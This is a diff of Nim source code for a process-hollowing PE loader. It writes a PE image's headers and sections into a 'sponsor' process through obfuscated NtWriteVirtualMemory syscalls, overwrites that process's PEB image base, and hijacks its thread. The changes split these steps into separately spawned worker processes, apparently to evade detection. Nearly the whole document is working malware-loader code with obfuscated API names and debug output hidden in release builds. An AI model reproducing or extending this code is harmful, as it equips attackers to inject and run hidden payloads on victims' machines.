@@ -35,7 +35,11 @@ proc createProcessWorker*(arg: string): PPROCESS_INFORMATION =
     return addr pi
 
 
-proc allocateMemoryProcess(processHandle: Handle, peImageImageBase: ptr PVOID, peImageSize: ptr size_t) =
+proc allocateMemoryProcess(
+    processHandle: Handle, 
+    peImageImageBase: ptr PVOID, 
+    peImageSize: ptr size_t
+) =
     if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
         processHandle,
         peImageImageBase,
@@ -49,8 +53,48 @@ proc allocateMemoryProcess(processHandle: Handle, peImageImageBase: ptr PVOID, p
         quit(0)
 
 
-proc writeMemoryProcess(processHandle: Handle) =
-    discard
+proc writeMemoryProcess(
+    processHandle: Handle,
+    peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
+    peImageImageBase: ptr PVOID, 
+    peBytesPtr: ptr byte, 
+    peImageSizeOfHeaders: size_t, 
+    peImageSectionsHeader: ptr IMAGE_SECTION_HEADER, 
+    sponsorPeb: PPEB
+) =
+    # Copy PE headers to sponsor process
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+        processHandle,
+        peImageImageBase,
+        peBytesPtr,
+        peImageSizeOfHeaders,
+        NULL
+    ) != 0:
+        quit(1)
+
+    # Copy PE sections to sponsor process  
+    for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
+        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+            processHandle,
+            peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
+            peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
+            peImageSectionsHeader[i].SizeOfRawData,
+            NULL
+        ) != 0:
+            quit(1)
+    
+    # Overwrite sponsor PEB with the new image base address 
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+        processHandle,
+        cast[LPVOID](cast[int](sponsorPeb) + 0x10),
+        peImageImageBase,
+        8,
+        NULL
+    ) != 0:
+        quit(1)
+    
+    # success
+    quit(0)
 
 proc setThreadProcess(threadHandle: Handle) =
     discard
@@ -103,9 +147,21 @@ proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): 
     # Parse command line arg
     for i in commandLineParams():
         if i.startsWith("-A:"):
-            allocateMemoryProcess(parseInt(i.replace("-A:", "")), addr peImageImageBase, addr peImageSize)
+            allocateMemoryProcess(
+                parseInt(i.replace("-A:", "")), 
+                addr peImageImageBase, 
+                addr peImageSize
+            )
         elif i.startsWith("-W:"):
-            writeMemoryProcess(parseInt(i.replace("-W:", "")))
+            writeMemoryProcess(
+                parseInt(i.replace("-W:", "")), 
+                peImageNtHeaders, 
+                addr peImageImageBase, 
+                peBytesPtr, 
+                peImageSizeOfHeaders, 
+                peImageSectionsHeader, 
+                sponsorPeb
+            )
         elif i.startsWith("-T:"):
             setThreadProcess(parseInt(i.replace("-T:", "")))
         elif i.startsWith("-R:"):
@@ -125,43 +181,15 @@ proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): 
     when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
     when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](peImageImageBase) + cast[int](peImageEntryPoint)).toHex 
 
-    # Copy PE headers to sponsor process 
-    when not defined(release): echo "[*] Copying PE headers to sponsor process"    
-    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
-        sponsorProcessHandle,
-        peImageImageBase,
-        peBytesPtr,
-        peImageSizeOfHeaders,
-        NULL
-    ) != 0:
+    # Copy PE to sponsor process 
+    when not defined(release): echo "[*] Copying PE to sponsor process"
+    ppi = createProcessWorker("-W:" & $sponsorProcessHandle)
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
         when not defined(release): echo "[-] Could not write to sponsor process"
-        quit() 
-
-    # Copy PE sections to sponsor process
-    when not defined(release): echo "[*] Copying PE sections to sponsor process"    
-    for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
-        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
-            sponsorProcessHandle,
-            peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
-            peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
-            peImageSectionsHeader[i].SizeOfRawData,
-            NULL
-        ) != 0:
-            when not defined(release): echo "[-] Could not write headers to sponsor process"
-            quit()
-    
-    # Overwrite sponsor PEB with the new image base address 
-    when not defined(release): echo "[*] Overwriting PEB with the new image base address"
-    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
-        sponsorProcessHandle,
-        cast[LPVOID](cast[int](sponsorPeb) + 0x10),
-        addr peImageImageBase,
-        8,
-        NULL
-    ) != 0:
-        when not defined(release): echo "[-] Could not write sections to sponsor process"
         quit()
-
+  
     # Change sponsor thread Entrypoint
     var context: CONTEXT
     context.ContextFlags = CONTEXT_INTEGER
